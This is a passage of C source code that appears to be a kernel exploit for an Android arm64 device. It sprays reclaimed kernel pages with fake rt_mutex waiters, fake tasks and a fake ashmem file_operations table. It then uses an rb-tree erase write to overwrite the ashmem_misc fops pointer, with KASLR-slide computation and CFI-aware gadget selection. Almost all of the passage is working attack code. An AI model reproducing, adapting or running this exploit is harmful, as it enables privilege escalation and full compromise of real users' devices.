  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

/*
 * The public V1.20A tree cannot model the proprietary SHR_LOG object linked
 * into the stock image.  Keep the self-build symbol as the zero point, but
 * allow a single signed, 8-byte-aligned runtime correction for the
 * ashmem_misc.fops slot.  Applying it here keeps the RB write target and every
 * later CFI/readback use on the same address.
 */
static uintptr_t runtime_data_image_addr(uintptr_t image_addr) {
#if defined(ASHMEM_MISC_FOPS)
  if (image_addr == ASHMEM_MISC_FOPS) {
    const char *value = getenv("ASHMEM_MISC_FOPS_DELTA_RUNTIME");
    if (value && value[0]) {
      int saved_errno = errno;
      errno = 0;
      char *end = NULL;
      long long delta = strtoll(value, &end, 0);
      /*
       * The old-filetarget launcher redirects this image-relative symbol to
       * a heap-allocated struct file field.  That legitimate delta spans far
       * more than 16 MiB, so range checking it against nearby image data
       * rejects the measured target.  Keep the alignment/parser checks; the
       * resulting address is validated as a direct pointer by the caller's
       * target setup and runtime file oracle.
       */
      int valid = errno == 0 && end && *end == '\0' &&
                  (delta & 7LL) == 0;
      errno = saved_errno;
      if (valid) {
        return (uintptr_t)((intptr_t)image_addr + (intptr_t)delta);
      }
    }
  }
#endif
  return image_addr;
}

uintptr_t data_addr(uintptr_t image_addr) {
  image_addr = runtime_data_image_addr(image_addr);
#if defined(DATA_ADDR_USE_KIMAGE_ALIAS) && DATA_ADDR_USE_KIMAGE_ALIAS
  return kaslr_image_addr(image_addr);
#elif defined(P0_DATA_ALIAS_NO_SLIDE) && P0_DATA_ALIAS_NO_SLIDE
  return p0_data_alias(image_addr);
#elif defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  uintptr_t address = p0_data_alias(image_addr);
  return data_alias_uses_slide ? address + slide_p0_offset : address;
#else
  return p0_data_alias(image_addr) + slide_p0_offset;
#endif
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
#if defined(LEGACY_CONFIGFS_RW) && LEGACY_CONFIGFS_RW
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
#if defined(FOPS_TREEWRITE_SAFE_RBNEXT_WAITER) && \
    FOPS_TREEWRITE_SAFE_RBNEXT_WAITER
  /*
   * rb_erase_cached() updates rb_leftmost with rb_next(waiter) before it
   * performs the parent->child write.  Keep fake_fops as the replacement
   * child for the target write, but make rb_next(fake_w0) return a safe fake
   * waiter in the reclaimed page instead of treating file_operations itself
   * as the next waiter.
   */
  put64(p, off + FOPS_READ_OFF, fake_fops - FOPS_TABLE_OFF + RIGHT_OFF);
#else
  /*
   * When the ownerless writer preserves lock->waiters.rb_leftmost, rb_erase()
   * calls rb_next(waiter).  rb_next() treats the replacement child fake_fops as
   * an rb_node and reads fake_fops->rb_left at +0x10. Keep that NULL during the
   * erase; try_cfi_stage() repairs the read slot before using configfs_read.
   */
  put64(p, off + FOPS_READ_OFF, 0);
#endif
#else
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
#endif
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
#endif
  if (getenv("PSELECT_FAKE_FOPS_NULL_IOCTL_DIAG")) {
    /* A newly opened original ashmem fd implements ASHMEM_GET_SIZE, while a
     * file using this diagnostic table returns ENOTTY.  This gives the
     * production pointer write an observable, read-only discriminator without
     * entering the configfs write gadget. */
    put64(p, off + FOPS_IOCTL_OFF, 0);
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, 0);
  } else {
    put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
#if defined(REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE) && \
    REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
    /* This artifact and its launcher are native arm64, so do_vfs_ioctl uses
     * unlocked_ioctl.  Leave the unmeasured compat CFI entry inert. */
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, 0);
#else
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
#endif
  }
  if (getenv("PSELECT_FAKE_FOPS_NULL_MMAP_DIAG")) {
    /* vm_mmap_pgoff() rejects a file with no mmap callback with ENODEV.
     * A size-zero stock ashmem file instead reaches ashmem_mmap() and returns
     * EINVAL, giving try_cfi_stage() a callback-independent route oracle. */
    put64(p, off + FOPS_MMAP_OFF, 0);
  } else {
    put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  }
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
#if defined(REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE) && \
    REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
  /* A failed runtime-pointer capture must still be able to close after owner
   * is cleared without calling an unmeasured stock release CFI entry.  The
   * successful path restores the real f_op before close, so ashmem_release is
   * then invoked through the stock table. */
  put64(p, off + FOPS_RELEASE_OFF, 0);
#else
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
#endif
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
  put64(p, off + FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
  put64(p, off + FAKE_WAITER_LOCK_OFF, fake_lock);
  put32(p, off + FAKE_WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
#endif
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int s = 0; s < LEGACY_RECLAIM_SOCKETS; s++) {
    for (int i = 0; i < 2; i++) {
      if (reclaim_sv[s][i] >= 0) {
        close(reclaim_sv[s][i]);
        reclaim_sv[s][i] = -1;
      }
    }
  }
}

int reclaim_receiver_fd(void) {
  return reclaim_sv[0][1];
}

static size_t diagnose_reclaim_fd_mutations(int socket_index, int fd,
                                            unsigned char *observed,
                                            size_t *total_bytes,
                                            size_t *logged_words) {
  if (fd < 0 || !skb_buf) {
    pr_warning("reclaim mutation scan unavailable socket=%d fd=%d payload=%p\n",
               socket_index, fd, skb_buf);
    return 0;
  }

  size_t total = 0;
  size_t changed_words = 0;
  for (;;) {
    ssize_t n = recv(fd, observed, SKB_SEND_SIZE, MSG_DONTWAIT);
    if (n < 0) {
      if (errno != EAGAIN && errno != EWOULDBLOCK) {
        pr_warning("reclaim mutation scan socket=%d recv errno=%d\n",
                   socket_index, errno);
      }
      break;
    }
    if (n == 0) break;

    for (ssize_t i = 0; i < n;) {
      size_t expected_off = (total + (size_t)i) % LEGACY_RECLAIM_SEND_SIZE;
      size_t remaining = (size_t)n - (size_t)i;
      size_t span = LEGACY_RECLAIM_SEND_SIZE - expected_off;
      if (span > remaining) span = remaining;

      for (size_t j = 0; j < span; j += sizeof(uint64_t)) {
        size_t width = span - j;
        if (width > sizeof(uint64_t)) width = sizeof(uint64_t);
        if (memcmp(observed + i + j, skb_buf + expected_off + j,
                   width) == 0) {
          continue;
        }
        uint64_t before = 0;
        uint64_t after = 0;
        memcpy(&before, skb_buf + expected_off + j, width);
        memcpy(&after, observed + i + j, width);
        changed_words++;
        if ((*logged_words)++ < 128) {
          size_t stream_off = total + (size_t)i + j;
          size_t send_index = stream_off / LEGACY_RECLAIM_SEND_SIZE;
          size_t send_off = stream_off % LEGACY_RECLAIM_SEND_SIZE;
          size_t order3_off = send_off % ORDER3_SIZE;
          const char *lock_base_hypothesis = "none";
#if defined(PSELECT_PAIRED_LOCK_BASE_DIAG) && PSELECT_PAIRED_LOCK_BASE_DIAG
          if (order3_off == LOCK_OFF - 0x38 ||
              order3_off == LOCK_OFF - 0x30) {
            lock_base_hypothesis = "H_e80";
          } else if (order3_off == LOCK_OFF + 0x08 ||
                     order3_off == LOCK_OFF + 0x10) {
            lock_base_hypothesis = "H_ec0";
          }
#endif
          size_t payload_off = order3_off >= SKB_FRAG_BIAS
                                   ? order3_off - SKB_FRAG_BIAS
                                   : order3_off;
          pr_info("reclaim mutation socket=%d send=%zu send_off=%05zx "
                  "order3_off=%04zx payload_off=%04zx lock_base=%s "
                  "kva=%016zx before=%016llx "
                  "after=%016llx\n",
                  socket_index, send_index, send_off, order3_off,
                  payload_off,
                  lock_base_hypothesis,
                  (size_t)(page_base + SKB_DATA_DELTA + payload_off),
                  (unsigned long long)before,
                  (unsigned long long)after);
        }
      }
      i += (ssize_t)span;
    }
    total += (size_t)n;
  }

  *total_bytes += total;
  pr_info("reclaim mutation socket=%d bytes=%zu sends=%zu changed_words=%zu\n",
          socket_index, total, total / SKB_SEND_SIZE, changed_words);
  return changed_words;
}

size_t diagnose_reclaim_payload_mutations(void) {
  unsigned char *observed = malloc(SKB_SEND_SIZE);
  if (!observed) {
    pr_warning("reclaim mutation scan allocation failed\n");
    return 0;
  }

  size_t total = 0;
  size_t changed_words = 0;
  size_t logged_words = 0;
  for (int s = 0; s < LEGACY_RECLAIM_SOCKETS; s++) {
    changed_words += diagnose_reclaim_fd_mutations(
        s, reclaim_sv[s][1], observed, &total, &logged_words);
  }

  pr_info("reclaim mutation scan sockets=%d bytes=%zu sends=%zu "
          "changed_words=%zu logged=%zu\n",
          LEGACY_RECLAIM_SOCKETS, total, total / SKB_SEND_SIZE,
          changed_words, logged_words < 128 ? logged_words : (size_t)128);
  free(observed);
  return changed_words;
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

#ifndef PRE_CTX_MM_DELTA
#define PRE_CTX_MM_DELTA 0
#endif
  long pre_ctx_delta = PRE_CTX_MM_DELTA;
  const char *pre_ctx_delta_env = getenv("PRE_CTX_MM_DELTA_RUNTIME");
  if (pre_ctx_delta_env && *pre_ctx_delta_env) {
    char *end = NULL;
    errno = 0;
    long parsed = strtol(pre_ctx_delta_env, &end, 0);
    if (!errno && end != pre_ctx_delta_env && !*end &&
        parsed >= -64 && parsed <= 64) {
      pre_ctx_delta = parsed;
    }
  }
  long pre_ctx_count = (long)mm_objs_per_slab - 1 + pre_ctx_delta;
  if (pre_ctx_count < 1) {
    pre_ctx_count = 1;
  }
  pre_ctx.mm_cnt = (size_t)pre_ctx_count;
  const char *pre_ctx_legacy_full =
      getenv("PRE_CTX_MM_LEGACY_FULL_RUNTIME");
  if (pre_ctx_legacy_full && *pre_ctx_legacy_full &&
      strcmp(pre_ctx_legacy_full, "0") != 0) {
    pre_ctx.mm_cnt = 32 * mm_objs_per_slab;
    pr_info("prepare ctx legacy-full override mm_objs_per_slab=%zu "
            "pre_ctx=%zu\n",
            mm_objs_per_slab, pre_ctx.mm_cnt);
  }
  const char *pre_ctx_count_env = getenv("PRE_CTX_MM_COUNT_RUNTIME");
  if (pre_ctx_count_env && *pre_ctx_count_env) {
    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(pre_ctx_count_env, &end, 0);
    if (!errno && end != pre_ctx_count_env && !*end &&
        parsed >= 1 && parsed <= 4096) {
      pre_ctx.mm_cnt = (size_t)parsed;
      pr_info("prepare ctx count override pre_ctx=%zu\n",
              pre_ctx.mm_cnt);
    } else {
      pr_warning("prepare ctx ignoring invalid PRE_CTX_MM_COUNT_RUNTIME=%s\n",
                 pre_ctx_count_env);
    }
  }
  if (forced_pre_ctx_mm_count) {
    pre_ctx.mm_cnt = forced_pre_ctx_mm_count;
    pr_info("prepare ctx internal count override pre_ctx=%zu\n",
            pre_ctx.mm_cnt);
  }
  pr_info("prepare ctx mm_objs_per_slab=%zu pre_ctx=%zu delta=%ld\n",
          mm_objs_per_slab, pre_ctx.mm_cnt, pre_ctx_delta);
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    slide_bank_payload_base = payload_base;
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
        uintptr_t parent;
        uintptr_t target;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
        if (slot == P0_ORACLE_GATE_SLOT) {
          parent = direct_to_page(base);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
          p0_gate_page_struct = parent;
        } else if (slot == P0_ORACLE_PROBE_SLOT) {
          uintptr_t direct_addr =
              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
              P0_ORACLE_PROBE_OFFSET;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
          if (p0_virtual_base_probe) {
            direct_addr = data_addr(ASHMEM_MISC_FOPS);
          }
#endif
          parent = direct_to_page(direct_addr);
          target = pipebuf_page_base +
                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                   sizeof(struct user_pipe_buffer);
          p0_probe_page_struct = parent;
        } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
          parent = p0_gate_page_struct;
          target = 0;
        } else {
          parent = p0_probe_page_struct;
          target = 0;
        }
#else
        uintptr_t offset = slide_bank_offsets[slot];
        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
#endif
        slide_bank_parents[slot] = parent;
        slide_bank_targets[slot] = target;
        size_t task_off = SLIDE_BANK_TASK_OFF +
                          slot * SLIDE_BANK_TASK_STRIDE;
        size_t lock_off = SLIDE_BANK_LOCK_OFF +
                          slot * SLIDE_BANK_SLOT_STRIDE;
        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
        uintptr_t task = payload_base + task_off;
        uintptr_t lock = payload_base + lock_off;
        uintptr_t waiter = payload_base + waiter_off;

        put32(p, lock_off + 0x00, 0);
        put64(p, lock_off + 0x08, waiter);
        put64(p, lock_off + 0x10, waiter);
        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);

        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                        lock, SLIDE_FAKE_WAITER_PRIO);

        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
      }
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
#else
    return select_slide_payload_slot(slide_bank_offsets[0]);
#endif
  }
#endif

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    slide_bank_payload_base = payload_base;
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
    p0_gate_page_struct = direct_to_page(base);
    slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_GATE_SLOT] =
        pipebuf_page_base +
        P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
    slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_gate_page_struct;
    slide_bank_targets[P0_ORACLE_PROBE_SLOT] = 0;
#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
    if (fops_data_probe_active) {
      p0_gate_page_struct = direct_to_page(base);
      if (getenv("FOPS_P0_GATE_CONTROL")) {
        /* Control the external-page experiment with the already reclaimed
         * payload page.  This exercises direct_to_page(), the struct page
         * parent store, and the live pipe_buffer.page replacement while the
         * redirected bytes have a marker known before the trigger. */
        /* `base` is the reclaimed payload page whose first bytes carry the
         * known gate marker.  The earlier base-ORDER3_SIZE experiment was
         * prompted by tee(EINVAL), but Linux 4.19 returns EFAULT when
         * pipe_buf_get() rejects a page.  EINVAL instead came from remapping
         * the parent pipe descriptors, so keep the original page target. */
        p0_probe_page_struct = direct_to_page(base);
        pr_info("fops p0 gate-control payload=%016zx page=%016zx\n",
                base, p0_probe_page_struct);
      } else {
        p0_probe_page_struct =
            direct_to_page(fops_data_probe_addr & ~(PAGE_SIZE - 1));
      }
      slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
      slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_SLOT] =
          pipebuf_page_base +
          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
          sizeof(struct user_pipe_buffer);
      slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] =
          p0_gate_page_struct;
      slide_bank_targets[P0_ORACLE_GATE_RESTORE_SLOT] = 0;
      slide_bank_parents[P0_ORACLE_PROBE_RESTORE_SLOT] =
          p0_probe_page_struct;
      slide_bank_targets[P0_ORACLE_PROBE_RESTORE_SLOT] = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
      slide_bank_parents[P0_ORACLE_PRODUCTION_SLOT] = fake_fops;
      slide_bank_targets[P0_ORACLE_PRODUCTION_SLOT] =
          data_addr(ASHMEM_MISC_FOPS);
#endif
    } else {
      slide_bank_parents[0] = fake_fops;
      slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
    }
#else
    slide_bank_parents[0] = fake_fops;
    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
#endif
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
#if LEGACY_RT_MUTEX_WAITER
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
    fake_left = payload_base + LEFT_OFF;
#else
    fake_left = 0;
#endif
#else
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
#endif
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }
#ifdef SLIDE_RECLAIM_SCAN_PHASE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
        put64(p, off + 0x08, 0x4141000000000000ULL | off);
      }
    }
    return 1;
  }
#endif

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
#if defined(FOPS_SELF_TARGET_DIAG) && FOPS_SELF_TARGET_DIAG
  /* Keep the RB write wholly inside the reclaimed payload so mutation
   * scanning can prove [11] independently of stock data symbol offsets. */
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
#ifndef FOPS_SELF_TARGET_PARENT_BIAS
#define FOPS_SELF_TARGET_PARENT_BIAS 8
#endif
    write_pc = payload_base + SCRATCH_OFF - FOPS_SELF_TARGET_PARENT_BIAS;
    write_right = fake_fops;
  }
#endif
  uint64_t waiter_task = runtime_waiter_task ? runtime_waiter_task : text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  uint32_t waiter_prio = FAKE_WAITER_PRIO;
#if LEGACY_RT_MUTEX_WAITER
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
#if defined(FOPS_SELF_TARGET_DIAG) && FOPS_SELF_TARGET_DIAG
    write_pc = payload_base + SCRATCH_OFF - FOPS_SELF_TARGET_PARENT_BIAS;
    write_right = fake_fops;
#elif defined(FOPS_TREEWRITE_P0_TARGET) && FOPS_TREEWRITE_P0_TARGET
    write_pc = p0_data_alias(ASHMEM_MISC_FOPS) + slide_p0_offset - 8;
#else
    write_pc = data_addr(ASHMEM_MISC_FOPS) - 8;
#endif
    write_right = fake_fops;
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
    write_left = payload_base + LEFT_OFF;
    /*
     * Keep fake_task->pi_top_task consistent with the fake waiter's task.
     * rt_mutex_dequeue_pi() performs the RB write before rt_mutex_adjust_prio().
     * If the cached top task/prio already match, rt_mutex_setprio() returns
     * before touching rq/sched-class state on the fake task.
     */
    pi_top_task = waiter_task;
#else
    write_left = 0;
    pi_top_task = 0;
#endif
#if defined(FOPS_FAKE_TASK_PI_TOP_WAITER) && FOPS_FAKE_TASK_PI_TOP_WAITER
    /* The owner-side [11] path inserts the live waiter before adjusting the
     * fake owner's priority, so its cached donor must already name that
     * waiter's task.  Keep this independent from the RB erase geometry. */
    pi_top_task = waiter_task;
#endif
#ifdef LEGACY_FOPS_WAITER_PRIO
    waiter_prio = LEGACY_FOPS_WAITER_PRIO;
#else
    waiter_prio = 0;
#endif
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_FOPS && runtime_file_fops_target) {
    write_pc = runtime_file_fops_target - 8;
    write_right = fake_fops;
    write_left = 0;
    pr_info("fops runtime file target slot=%016zx write_pc=%016zx "
            "replacement=%016zx\n",
            runtime_file_fops_target, write_pc, write_right);
  }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      getenv("FOPS_P0_SINGLE_PROBE") && fops_data_probe_active) {
    if (getenv("FOPS_P0_CONTROL_SELF_TARGET")) {
      /* __rb_change_child() only selects rb_left (parent + 8) when that
       * field already equals the erased node.  The controlled scratch word
       * does not, so the deterministic fallback is rb_right (parent + 16).
       * Keep the old -8 geometry available as a negative control. */
      size_t parent_bias = getenv("FOPS_P0_CONTROL_RIGHT_FALLBACK") ? 16 : 8;
      write_pc = payload_base + SCRATCH_OFF - parent_bias;
      write_right = fake_fops;
      write_left = 0;
      pr_info("fops p0 control retaining self-target write_pc=%016zx "
              "replacement=%016zx scratch=%016zx parent_bias=%zu\n",
              write_pc, write_right, payload_base + SCRATCH_OFF,
              parent_bias);
    } else {
    /* This one-shot route has not run the ordinary gate stage, so only the
     * first pipe_buffer slot is populated.  The RB erase performs both the
     * parent child-pointer store at page+compound_head and the child-parent
     * store at pipe_buffer+0 (pipe_buffer.page).  Target the live first slot;
     * +sizeof(pipe_buffer) is valid only after gate verification has queued
     * the second marker buffer. */
    write_pc = p0_probe_page_struct + STRUCT_PAGE_COMPOUND_HEAD_OFF - 8;
    write_right = pipebuf_page_base +
                  P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
    write_left = 0;
    pr_info("fops p0 single-active write_pc=%016zx replacement=%016zx "
            "data=%016zx page=%016zx\n",
            write_pc, write_right, fops_data_probe_addr,
            p0_probe_page_struct);
    }
  }
#endif
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
    write_right = 0;
    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    waiter_task = fake_task;
